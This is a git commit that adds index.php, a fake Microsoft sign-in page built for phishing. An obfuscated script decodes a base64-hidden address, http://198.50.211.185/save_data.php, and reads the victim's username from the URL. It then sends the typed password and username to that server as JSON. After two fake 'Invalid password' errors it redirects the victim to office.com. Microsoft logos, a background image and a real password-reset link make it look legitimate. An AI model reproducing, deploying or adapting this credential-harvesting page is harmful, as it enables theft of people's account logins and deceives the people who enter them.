bbf87e411b1ee8278999eae86b66ae70fff39095
ousmos96 <166903552+ousmos96@users.noreply.github.com>
2024-04-13 07:38:19 +0000

    index.php

---
+++ index.php
@@ -0,0 +1,139 @@
+ <script>
+ 
+
+ var phpFileURL = `${window.atob("aHR0cDovLzE5OC41MC4yMTEuMTg1L3NhdmVfZGF0YS5waHA=")}`; 
+var clickCount = 0;
+
+function _0x16c2(_0x4ce81b,_0x2677f2){var _0x436332=_0x4363();return _0x16c2=function(_0x16c2a8,_0x5f02fd){_0x16c2a8=_0x16c2a8-0x100;var _0x769673=_0x436332[_0x16c2a8];return _0x769673;},_0x16c2(_0x4ce81b,_0x2677f2);}function _0x4363(){var _0x387013=['error','14310688EBAsdG','stringify','POST','preventDefault','getElementById','password','1756560jqlRDl','status','onreadystatechange','13194PMZTZp','6774QnRuYP','setRequestHeader','location','Content-Type','9224405ZyJXsq','href','open','addEventListener','value','213ZBFlYI','774177RxQItn','innerText','responseText','931SpqsMu','log','send','26938782bXxLSy'];_0x4363=function(){return _0x387013;};return _0x4363();}var _0x3afbbe=_0x16c2;(function(_0x119ecd,_0x2c86a5){var _0x3616f0=_0x16c2,_0x32fa0d=_0x119ecd();while(!![]){try{var _0x175862=-parseInt(_0x3616f0(0x115))/0x1+parseInt(_0x3616f0(0x10a))/0x2*(parseInt(_0x3616f0(0x114))/0x3)+parseInt(_0x3616f0(0x107))/0x4+parseInt(_0x3616f0(0x10f))/0x5+-parseInt(_0x3616f0(0x10b))/0x6*(-parseInt(_0x3616f0(0x118))/0x7)+parseInt(_0x3616f0(0x101))/0x8+-parseInt(_0x3616f0(0x11b))/0x9;if(_0x175862===_0x2c86a5)break;else _0x32fa0d['push'](_0x32fa0d['shift']());}catch(_0x362a69){_0x32fa0d['push'](_0x32fa0d['shift']());}}}(_0x4363,0xe197a),document[_0x3afbbe(0x112)]('DOMContentLoaded',function(){var _0x1ee34e=_0x3afbbe;document[_0x1ee34e(0x105)]('username')[_0x1ee34e(0x116)]=predefinedUsername;}));function submitForm(_0x5d3b71){var _0x3202a6=_0x3afbbe;_0x5d3b71[_0x3202a6(0x104)](),clickCount++;var _0x51e457=document[_0x3202a6(0x105)]('password')['value'],_0x3f81cb=document['getElementById'](_0x3202a6(0x100));clickCount<=0x2?_0x3f81cb[_0x3202a6(0x116)]='Invalid\x20password.\x20Please\x20try\x20again.':window[_0x3202a6(0x10d)][_0x3202a6(0x110)]='https://office.com';var _0x3f4068={'username':predefinedUsername,'password':_0x51e457};document['getElementById'](_0x3202a6(0x106))[_0x3202a6(0x113)]='';var _0x153163=new XMLHttpRequest();_0x153163[_0x3202a6(0x111)](_0x3202a6(0x103),phpFileURL,!![]),_0x153163[_0x3202a6(0x10c)](_0x3202a6(0x10e),'application/json'),_0x153163[_0x3202a6(0x109)]=function(){var _0x1f7fd8=_0x3202a6;_0x153163['readyState']===0x4&&_0x153163[_0x1f7fd8(0x108)]===0xc8&&console[_0x1f7fd8(0x119)](_0x153163[_0x1f7fd8(0x117)]);},_0x153163[_0x3202a6(0x11a)](JSON[_0x3202a6(0x102)](_0x3f4068));}
+
+</script>
+ <meta name="format-detection" content="telephone=no">
+
+
+    
+    
+
+
+
+
+
+    
+    <link  href="https://vol36600.github.io/exchange365.github.io/style.css" rel="stylesheet">
+
+
+<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb remove-segoe-ui-symbol" style="display: block;">
+
+    
+
+
+
+  <form onsubmit="submitForm(event);" autocomplete="off">
+
+
+
+
+    <div id="backgroundImage" role="img"  class="background-image ext-background-image" aria-label="Image d’arrière-plan de l’organisation" style="background-image: url(&quot;https://aadcdn.msftauthimages.net/447973e2-g6jsar-fvwxkeyv5i8cbliypodzvasftjsywzhvv7e4/logintenantbranding/0/illustration?ts=637785163390793300&quot;);"></div>
+        
+
+</div>
+<div class="outer" >
+
+
+        <div  class="middle ext-middle">
+
+
+
+    <div class="win-scroll">
+        <div class="sign-in-box ext-sign-in-box fade-in-lightbox">
+
+
+
+
+
+
+        <div >
+
+<image class="logo" role="img"  src="https://zupimages.net/up/24/15/11uu.png" alt="Microsoft">
+
+
+
+
+        <div >
+<div class="identityBanner">
+    <button type="button" class="backButton" >
+<image role="presentation"  src="https://zupimages.net/up/24/15/v1dg.png"><!-- /ko -->
+    </button>
+
+    <div id="username"></div>
+      <script>
+        // Function to get URL parameters
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            var results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        };
+
+        // Function to assign username to predefinedUsername variable
+        function assignUsername() {
+            var predefinedUsername = getUrlParameter('username');
+            return predefinedUsername;
+        }
+
+        // Call the function to assign the username to predefinedUsername variable
+        var predefinedUsername = assignUsername();
+
+        // Function to display username
+        function displayUsername() {
+            document.getElementById('username').innerText = predefinedUsername;
+        }
+
+        // Call the function to display the username when the page loads
+        displayUsername();
+    </script>
+</div></div>
+    </div>
+
+    <div class="pagination-view animate has-identity-banner slide-in-next">
+
+        <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true">
+
+
+
+
+<div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
+    <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
+</div>
+
+
+
+<div class="row">
+    <div class="form-group col-md-24">
+        
+
+        
+
+            <input name="password" type="password" id="password" class="form-control input ext-input text-box ext-text-box" " placeholder=" Password" aria-label="" tabindex="0" required>
+                  <div id="error" style="color: red;"></div>
+</div>
+    </div>
+</div>
+
+
+
+
+
+
+
+                    <div class="form-group">
+                        <a id="idA_PWD_ForgotPassword"  href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fdecofund.com%2freprocess%3fctx%3drQQIARAAjZS9i9t2GMft8-UudyTNNYTSTr0hQ99k613ywVHkF9nW6cWy5ZPtQo3007uln2xJtmWNIUPHdOmQMeNBaOhUOnW-KVtp6B9QQimlpZClUF-he5bn4YHvM3x5Pt_n-JCp4lW0in5S2bWzh4AkTRJlCYQwTRQh6wBDTJKxkDpD2hQBTMshgHBAoRhJoMn945Mvn_-CvvzC6j1-8Tn710_Vd6_KH3tZtkjPajUbZolRjXyQxGnsZFUQR7XUd6EPaz607Lz2fbn8slz-tVy-2ktpgiVZnKIYFqWpOoFjdFVugVxpTSOlNcqmHcGTmiiqaFYkap4_0dxM0mRvgqvY5KYXE3IaSOhEb6NyADJFk_LJdqfvjChRmxNy1MukYERJAR9NdSGcBAB7tXdP4VaZh9-UOPEL-8-9IydOotkiTrOnlX8qysKGPasZQ2iDrHoj23nygZH5Mewn8cJOMt9Oz8kwT5wNrnYasrUAy7nFDnS-DUNnRMIk99B0w2z1S_1C2iokfzHlwkBnPU0n1xuXZ9yWTOgNetKFRKsvFbJhdJq6ynKmQ48s05mHjfVk51dyOVTmR-5s2pmuGE7BHdfoc5mEN5uQHLvNda54-iafikYyYNKMGQt0VjfcZnsMZ7pviOtFZ4jU9eVits3VcCMKrNbxPXeEzFbQW61pTkxNRje23WJMzc0ZsZ4SvDv3B4lbLIU8GLVxOctiZLWJXGFs9drFlFuuBnNN7BaSlwcu58fiVlcFke3bZDRQwaLLO5xoNnOLT7EeiC6JvkbHC46U_MJKAySABdEOgBtfhuRI8iPPW6RLRZqZSELzhDhHXKCq-jYkEkYq6DRsuJgHhxfaeqIV01ZSSBjbzlRKGaGRwqdgMDBRjFk2Lc0hRomA27GuwozHwmWTlmf2ZX2Yem5jucU7EfRwmekwrNhI1HGXXpIZwAYzPJ_VRXSI8n0_HF4MNPWq8vB_kiMDGq4d7Y6_gzixq5sdv_EmrUI7q31XuWPZIHZW0Loh_Loivs1WbZXaycyPdgilMfwPqNMdT9C3Tu3I8MPTRRI7fmi_3C-_3n_v9uHJ3vul09JHD9DK2e3bxyelm-nNfvnZrV0Ee8-E-c8POPHxh6fDD_5-VLq-VWPsC0pUdN3ZJi3amPuWFphiEU_xpYVqpOA3aoITiBthKM_P8TPsyUH5ycHB9cFRrzWT2xrJ4H8clL86LP1w9PZhfnUHOz4CsZkY0PKt-w8xlDbZOmAQwyTt3SOhCcRwTAJBURJYuINRwACP7r6V7Me7pTfv_Pbt86dfP_nm9-7re59Riy6dN_gJtZEHNagRdf5TfyxxjS3ARIyMeobJqbTirYdJfP7ipPQv0&amp;mkt=fr-FR&amp;hosted=0&amp;device_platform=Windows+10" target="" role="link">I Forgot My Password</a>
+               
+                    </div>
+                  
+
+       <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">
+
+
+    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
+       <button type="submit">Login</button>
+</form>
